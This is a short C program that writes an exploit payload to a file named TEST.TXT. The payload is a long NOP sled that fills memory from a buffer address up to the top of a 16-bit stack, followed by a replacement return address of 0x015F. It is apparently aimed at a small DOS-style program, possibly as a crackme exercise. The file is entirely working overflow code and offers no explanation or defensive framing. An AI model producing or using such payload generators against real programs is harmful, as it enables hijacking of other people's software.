#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

const uint16_t BUF_ADDR  = 0x01CB;
const uint16_t NOP_UNTIL = 0xFFFC;  // we need to break stack
// const uint16_t NOP_UNTIL = 0x0103;

// const uint8_t CALL_CODE       = 0xE8;
const uint8_t NEW_CALL_ADDR_L = 0x5F;
const uint8_t NEW_CALL_ADDR_H = 0x01;

int main()
{
    FILE * file = fopen("TEST.TXT", "wb");

    for (uint16_t index = BUF_ADDR; index != NOP_UNTIL; index++){
        fputc(0x90, file);
    }

    // fputc(CALL_CODE, file);
    // fputc(NEW_CALL_ADDR_L, file);
    // fputc(NEW_CALL_ADDR_H, file);

    fputc(NEW_CALL_ADDR_L, file);
    fputc(NEW_CALL_ADDR_H, file);
    fputc(0x0D, file);

    fclose(file);

    return 0;
}
